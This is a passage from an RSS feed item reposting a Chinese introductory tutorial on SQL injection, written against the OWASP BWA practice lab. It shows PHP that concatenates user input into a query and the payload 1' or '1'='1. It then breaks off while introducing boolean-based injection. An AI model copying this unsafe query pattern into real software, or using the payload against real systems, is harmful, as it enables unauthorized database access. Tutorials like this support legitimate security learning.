             · &lt;a title=&quot;声望值&quot; target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/char_c/reputation/&quot;&gt;&lt;i class=&quot;fa fa-graduation-cap&quot;&gt;&lt;/i&gt; 13&lt;/a&gt; · &lt;a title=&quot;微博主页&quot; target=&quot;_blank&quot; href=&quot;http://weibo.com/sb148&quot;&gt;&lt;i class=&quot;fa fa-weibo&quot;&gt;&lt;/i&gt;&lt;/a&gt;         &lt;/span&gt;
    &lt;/div&gt;
	&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Wed, 11 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-11-109702-96c54dcb2.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-11-109702-96c54dcb2.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>SQL 注入详解扫盲</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;实习期间的主要工作还是研究 WEB 安全，编程语言是 Python，常用到正则表达式，对 HTTP 的协议也非常清晰。&lt;/p&gt;
&lt;p&gt;刚过来的时候，研究的主要是 SQL 注入，因为之前没有搞过安全，所有费了好长一段时间学习 SQL 注入的基本知识。&lt;strong&gt;这篇文章并不是什么很深入的技术文章，或许应该叫它‘ SQL注入扫盲 ’&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&quot;关于-SQL-Injection&quot;&gt;关于 SQL Injection&lt;/h2&gt;
&lt;p&gt;SQL Injection 就是通过把恶意的 SQL 命令插入到 Web 表单让服务器执行，最终达到欺骗服务器或数据库执行恶意的 SQL 命令。&lt;/p&gt;
&lt;p&gt;学习 SQL 注入，首先要搭一个靶机环境，我使用的是 &lt;a href=&quot;https://www.owasp.org/index.php/GPC_Project_Details/OWASP_BWA_Project&quot; target=&quot;_blank&quot;&gt;OWASP BWA&lt;/a&gt;，感兴趣的可以去官网下载一个安装，除了 SQL 注入，很多靶机环境都可以在 BWA 中找到，它专门为 &lt;a href=&quot;https://github.com/zaproxy/zaproxy&quot; target=&quot;_blank&quot;&gt;OWASP ZAP&lt;/a&gt; 渗透工具设计的。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3245919753343&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
$id = $_GET[&#39;id&#39;];
$getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&quot;;
$result = mysql_query($getid) or die(&#39;&amp;lt;pre&amp;gt;&#39; . mysql_error() . &#39;&amp;lt;/pre&amp;gt;&#39; );
$num = mysql_numrows($result);&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3245919753343-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3245919753343-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3245919753343-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3245919753343-4&quot;&gt;4&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3245919753343-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_GET&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;id&#39;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3245919753343-2&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;getid&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3245919753343-3&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;getid&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3245919753343-4&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;mysql_numrows&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0015 seconds] --&gt;
&lt;p&gt;这是一个很简单的 PHP代码，从前台获得 &lt;code&gt;id&lt;/code&gt; 的值，交给数据库来执行，把结果返回给前台。&lt;/p&gt;
&lt;p&gt;比如我们在 OWASP 里输入 &lt;code&gt;id = 1&lt;/code&gt;，点击 Submit，返回结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone&quot; src=&quot;/images/jobbole.com/e75c45c91ea794600dc8630cc377f3da.jpg&quot; width=&quot;675&quot; height=&quot;204&quot;&gt;&lt;/p&gt;
&lt;p&gt;稍微懂一点后台或者数据库的人都知道，上面的那段代码是有严重问题的，&lt;strong&gt;没有对 id 的值进行有效性、合法性判断&lt;/strong&gt;。也就是说，我们在 submit 输入框输入的如何内容都会被提交给数据库执行，比如在输入框输入&lt;code&gt;1&#39; or &#39;1&#39;=&#39;1&lt;/code&gt;，执行就会变成：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c325d581716695&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
//原先要在数据库中执行的命令
SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39;
//变成
SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39; or &#39;1&#39;=&#39;1&#39;&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c325d581716695-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c325d581716695-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c325d581716695-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c325d581716695-4&quot;&gt;4&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c325d581716695-1&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//原先要在数据库中执行的命令&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c325d581716695-2&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;SELECT &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;first_name&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;last_name &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;FROM &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;users &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;WHERE &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;user_id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;1&#39;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c325d581716695-3&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//变成&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c325d581716695-4&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;SELECT &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;first_name&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;last_name &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;FROM &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;users &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;WHERE &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;user_id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;1&#39;&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0009 seconds] --&gt;
&lt;p&gt;&lt;strong&gt;注意一下单引号，这是 SQL 注入中非常重要的一个地方，所以注入代码的最后要补充一个 &lt;code&gt;&#39;1&#39;=&#39;1&lt;/code&gt;让单引号闭合。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于 or 的执行，会把数据库表 users 中的所有内容显示出来，&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone&quot; src=&quot;/images/jobbole.com/6c26419dcc7ac150d21d3ffdd9202265.jpg&quot; width=&quot;446&quot; height=&quot;496&quot;&gt;&lt;/p&gt;
&lt;p&gt;下面对三种主要的注入类型进行介绍。&lt;/p&gt;
&lt;h2 id=&quot;Boolean-based-原理分析&quot;&gt;Boolean-based 原理分析&lt;/h2&gt;
&lt;p&gt;首先不得不讲SQL中的AND和OR&lt;br&gt;
AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。&lt;br&gt;
AND:返回第一个条件和第二个条件都成立的记录。&lt;br&gt;
OR:返回满足第一个条件或第二个条件的记录。&lt;br&gt;
AND和OR即为集合论中的交集和并集。&lt;br&gt;
下面是一个数据库的查询内容。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3264196037603&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
mysql&amp;gt; select * from students;
+-------+-------+-----+
| id    | name  | age |
+-------+-------+-----+
| 10056 | Doris |  20 |
| 10058 | Jaune |  22 |
| 10060 | Alisa |  29 |
+-------+-------+-----+
3 rows in set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3264196037603-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3264196037603-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3264196037603-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3264196037603-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3264196037603-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3264196037603-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3264196037603-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3264196037603-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3264196037603-9&quot;&gt;9&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3264196037603-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;select *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;students&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3264196037603-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3264196037603-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3264196037603-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3264196037603-5&quot;&gt;
